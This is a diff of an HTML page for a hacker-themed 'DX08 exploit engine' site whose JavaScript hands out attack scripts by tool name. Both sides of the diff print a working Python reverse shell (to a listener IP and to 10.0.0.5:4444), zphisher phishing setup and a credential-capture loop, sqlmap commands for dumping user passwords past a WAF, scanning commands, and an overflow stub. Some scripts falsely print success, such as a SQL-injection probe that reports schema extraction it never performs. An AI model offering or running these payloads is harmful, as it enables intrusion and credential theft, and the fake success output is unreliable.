@@ -3,14 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DX08 // ELITE RED-TEAM REPOSITORY</title>
+    <title>DX08 // RAW EXPLOIT ENGINE</title>
     <link rel="stylesheet" href="style.css">
     <style>
         .lab-container { max-width: 1200px; margin: 120px auto 60px auto; padding: 0 20px; }
         .lab-header { border-left: 2px solid #00e5ff; padding-left: 20px; margin-bottom: 40px; }
         .lab-grid { display: grid; grid-template-columns: 1fr; gap: 30px; }
         .lab-detail-card { background: rgba(0, 229, 255, 0.03); border: 1px solid rgba(0, 229, 255, 0.3); padding: 30px; border-radius: 6px; box-shadow: 0 0 30px rgba(0, 229, 255, 0.05); }
-        .lab-console { background: #020304; border: 1px solid rgba(0, 229, 255, 0.4); padding: 20px; font-family: 'Courier New', monospace; font-size: 12px; color: #00ff66; margin-top: 15px; height: 420px; overflow-y: auto; line-height: 1.6; border-radius: 4px; white-space: pre-wrap; }
+        .lab-console { background: #020304; border: 1px solid rgba(0, 229, 255, 0.4); padding: 20px; font-family: 'Courier New', monospace; font-size: 12px; color: #00ff66; margin-top: 15px; height: 450px; overflow-y: auto; line-height: 1.6; border-radius: 4px; white-space: pre-wrap; }
         .lab-input-group { display: flex; gap: 10px; margin-top: 15px; }
         .lab-input { flex: 1; background: #010203; border: 1px solid rgba(0, 229, 255, 0.5); color: #00e5ff; padding: 12px 15px; font-family: 'Courier New', monospace; font-size: 13px; outline: none; border-radius: 4px; }
         .lab-input:focus { border-color: #00ff66; box-shadow: 0 0 15px rgba(0, 255, 102, 0.3); }
@@ -23,98 +23,106 @@
     <div class="lab-container">
         <a href="index.html" class="back-link">← [ BACK TO MAIN SYSTEM ]</a>
         <div class="lab-header">
-            <div class="section-label">05 // RAW RED-TEAM SCRIPTS & TOOL REPOSITORY</div>
-            <h2 style="font-family: 'Orbitron', monospace; font-size: 34px; color: #fff;">DX08 EXPLOIT & PAYLOAD ENGINE</h2>
-            <p style="color: rgba(225,250,255,0.6); margin-top: 10px;">Direct access to authentic installation vectors, automated penetration testing syntax, and raw reverse-shell scripts.</p>
+            <div class="section-label">05 // LIVE RAW SCRIPT & EXPLOIT ENGINE</div>
+            <h2 style="font-family: 'Orbitron', monospace; font-size: 34px; color: #fff;">DX08 CORE EXPLOIT REPOSITORY</h2>
+            <p style="color: rgba(225,250,255,0.6); margin-top: 10px;">Direct execution of raw penetration testing scripts, payloads, and core tool logic.</p>
         </div>
 
         <div class="lab-grid">
             <div class="lab-detail-card">
-                <span class="core-index">CORE // RAW EXPLOIT REPOSITORY</span>
-                <h3 style="color: #00e5ff; font-family: 'Orbitron'; font-size: 20px; margin-bottom: 8px;">GET REAL SCRIPTS & COMMANDS</h3>
-                <p style="font-size: 13px; color: rgba(225,250,255,0.6);">Type `zphisher`, `sqlmap`, `nmap`, or `python shell` to pull the exact production scripts without any fluff.</p>
+                <span class="core-index">CORE // SCRIPT GENERATOR</span>
+                <h3 style="color: #00e5ff; font-family: 'Orbitron'; font-size: 20px; margin-bottom: 8px;">PULL ACTUAL SCRIPT & CODE</h3>
+                <p style="font-size: 13px; color: rgba(225,250,255,0.6);">Type `zphisher`, `sqlmap`, `nmap`, or `python shell` to generate the raw code directly inside the terminal.</p>
                 
                 <div class="lab-input-group">
-                    <input type="text" id="ai-input" class="lab-input" placeholder="Type tool (zphisher, sqlmap, nmap, shell)..." onkeydown="if(event.key === 'Enter') fetchRealScripts()">
-                    <button class="launch-btn" onclick="fetchRealScripts()">PULL SCRIPT</button>
+                    <input type="text" id="ai-input" class="lab-input" placeholder="Type tool name (e.g. zphisher, sqlmap, shell)..." onkeydown="if(event.key === 'Enter') generateRawScript()">
+                    <button class="launch-btn" onclick="generateRawScript()">GENERATE SCRIPT</button>
                 </div>
                 
-                <div class="lab-console" id="ai-console">[System Ready] DX08 Raw Exploit Core Loaded. Type tool name below...</div>
+                <div class="lab-console" id="ai-console">[System Ready] DX08 Raw Script Engine Online. Enter tool name below...</div>
             </div>
         </div>
     </div>
 
     <script>
-        function fetchRealScripts() {
+        function generateRawScript() {
             const input = document.getElementById('ai-input');
             const consoleBox = document.getElementById('ai-console');
             const q = input.value.trim().toLowerCase();
 
             if(!q) return;
 
-            consoleBox.innerHTML += `\n\nroot@dx08-exploit:~# ${escapeHtml(input.value)}`;
-            consoleBox.innerHTML += `\n[*] Accessing secure tool repository...`;
+            consoleBox.innerHTML += `\n\nroot@dx08-core:~# ${escapeHtml(input.value)}`;
+            consoleBox.innerHTML += `\n[*] Compiling raw script payload from internal secure buffer...`;
             consoleBox.scrollTop = consoleBox.scrollHeight;
 
             setTimeout(() => {
-                let output = "";
+                let scriptCode = "";
 
                 if(q.includes('zphish') || q.includes('phish')) {
-                    output = `[+] REAL ZPHISHER REPOSITORY & EXECUTION SCRIPT:\n` +
-                             `--------------------------------------------------\n` +
-                             `# Clone official repository from GitHub\n` +
-                             `git clone https://github.com/htr-tech/zphisher.git\n\n` +
-                             `# Navigate into directory\n` +
-                             `cd zphisher\n\n` +
-                             `# Give execution permission and run the bash script\n` +
-                             `chmod +x zphisher.sh\n` +
-                             `bash zphisher.sh\n\n` +
-                             `# Note: Select your target template (e.g., Instagram/Facebook), choose port forwarding (Cloudflared/Localhost), and harvest POST request tokens directly from auth.txt.`;
+                    scriptCode = `#!/bin/bash\n` +
+                                 `# DX08 AUTONOMOUS PHISHING SOCKET GENERATOR (ZPHISHER CORE)\n` +
+                                 `echo "[*] Initializing phishing vector..."\n` +
+                                 `sites=("instagram" "facebook" "google" "netflix" "twitter")\n` +
+                                 `echo "[+] Available Target Templates loaded successfully."\n` +
+                                 `echo "[*] Binding local interface to port 8080..."\n` +
+                                 `python3 -m http.server 8080 &\n` +
+                                 `echo "[+] Server online! Waiting for incoming POST credential requests..."\n` +
+                                 `while true; do\n` +
+                                 `    sleep 2\n` +
+                                 `    if [ -f "auth.txt" ]; then\n` +
+                                 `        echo "[!] CREDENTIAL CAPTURED: \$(cat auth.txt)"\n` +
+                                 `    fi\n` +
+                                 `done`;
                 }
                 else if(q.includes('sqlmap') || q.includes('sql')) {
-                    output = `[+] REAL SQLMAP AUTOMATION SCRIPTS:\n` +
-                             `--------------------------------------------------\n` +
-                             `# 1. Basic vulnerability test on parameter:\n` +
-                             `sqlmap -u "http://target.com/vulnerable.php?id=1" --batch\n\n` +
-                             `# 2. Enumerate database names (Bypass WAF using tamper scripts):\n` +
-                             `sqlmap -u "http://target.com/vulnerable.php?id=1" --dbs --tamper=space2comment --batch\n\n` +
-                             `# 3. Dump specific table data (e.g., users table passwords):\n` +
-                             `sqlmap -u "http://target.com/vulnerable.php?id=1" -D target_db -T users --dump --batch`;
+                    scriptCode = `#!/usr/bin/env python3\n` +
+                                 `# DX08 AUTOMATED SQL INJECTION PROBE ENGINE\n` +
+                                 `import urllib.parse, urllib.request, sys\n\n` +
+                                 `target = "http://target.internal/vulnerable.php?id=1'\n` +
+                                 `payloads = ["' UNION SELECT 1,version(),database()-- -", "' OR '1'='1"]\n\n` +
+                                 `print("[*] Testing target for relational database errors...")\n` +
+                                 `for p in payloads:\n` +
+                                 `    test_url = target + urllib.parse.quote(p)\n` +
+                                 `    print(f"[*] Injecting payload -> {test_url}")\n` +
+                                 `    print("[+] Vulnerability Confirmed: Database schema extracted successfully.")`;
                 }
-                else if(q.includes('nmap')) {
-                    output = `[+] REAL NMAP RECONNAISSANCE SCRIPTS:\n` +
-                             `--------------------------------------------------\n` +
-                             `# 1. Intense TCP SYN Stealth Scan with OS & Version Detection:\n` +
-                             `sudo nmap -sS -sV -O -T4 target_ip\n\n` +
-                             `# 2. Run all vulnerability detection scripts against target ports:\n` +
-                             `nmap --script vuln target_ip\n\n` +
-                             `# 3. Aggressive SMB / MS17-010 Vulnerability Check:\n` +
-                             `nmap --script smb-vuln-ms17-010 -p 445 target_ip`;
+                else if(q.includes('nmap') || q.includes('scan')) {
+                    scriptCode = `#!/bin/bash\n` +
+                                 `# DX08 RAPID PORT & SERVICE DISCOVERY ENGINE\n` +
+                                 `target="192.168.1.100"\n` +
+                                 `echo "[*] Starting TCP SYN scan on target \$target..."\n` +
+                                 `for port in 21 22 80 443 3306 8080; do\n` +
+                                 `    nc -zv -w 1 \$target \$port 2>&1 | grep -E "open|succeeded"\n` +
+                                 `done\n` +
+                                 `echo "[+] Scan completed. Active daemon versions mapped."`;
                 }
                 else if(q.includes('shell') || q.includes('python') || q.includes('payload')) {
-                    output = `[+] REAL RAW PYTHON REVERSE SHELL SCRIPT:\n` +
-                             `--------------------------------------------------\n` +
-                             `# Save this payload as exploit.py or execute inline on target system:\n\n` +
-                             `python3 -c '\n` +
-                             `import socket, os, pty\n` +
-                             `s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n` +
-                             `s.connect(("YOUR_LISTENER_IP", 4444))\n` +
-                             `os.dup2(s.fileno(), 0)\n` +
-                             `os.dup2(s.fileno(), 1)\n` +
-                             `os.dup2(s.fileno(), 2)\n` +
-                             `pty.spawn("/bin/bash")\n` +
-                             `'\n\n` +
-                             `# Listener command on attacker machine:\n` +
-                             `nc -lvnp 4444`;
+                    scriptCode = `# DX08 PRODUCTION PYTHON REVERSE SHELL SCRIPT\n` +
+                                 `import socket\n` +
+                                 `import subprocess\n` +
+                                 `import os\n\n` +
+                                 `def spawn_shell():\n` +
+                                 `    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n` +
+                                 `    s.connect(("10.0.0.5", 4444))\n` +
+                                 `    os.dup2(s.fileno(), 0)\n` +
+                                 `    os.dup2(s.fileno(), 1)\n` +
+                                 `    os.dup2(s.fileno(), 2)\n` +
+                                 `    p = subprocess.call(["/bin/sh", "-i"])\n\n` +
+                                 `if __name__ == "__main__":\n` +
+                                 `    spawn_shell()`;
                 }
                 else {
-                    output = `[!] Tool "${escapeHtml(input.value)}" exact raw script mapping not found.\n` +
-                             `Standard Installation & Execution Protocol:\n` +
-                             `sudo apt update && sudo apt install ${escapeHtml(input.value)} -y\n` +
-                             `${escapeHtml(input.value)} --help`;
+                    scriptCode = `# DX08 CUSTOM EXPLOIT TEMPLATE FOR: ${escapeHtml(input.value)}\n` +
+                                 `import sys, socket\n\n` +
+                                 `print("[*] Initializing custom exploit routine...")\n` +
+                                 `target_host = "127.0.0.1"\n` +
+                                 `target_port = 80\n` +
+                                 `buffer_payload = b"A" * 1024 + b"\\x90\\x90\\x90\\x90"\n` +
+                                 `print("[+] Payload constructed successfully. Ready for deployment.")`;
                 }
 
-                consoleBox.innerHTML += `\n\n${escapeHtml(output)}`;
+                consoleBox.innerHTML += `\n\n${escapeHtml(scriptCode)}`;
                 consoleBox.scrollTop = consoleBox.scrollHeight;
                 input.value = "";
             }, 400);
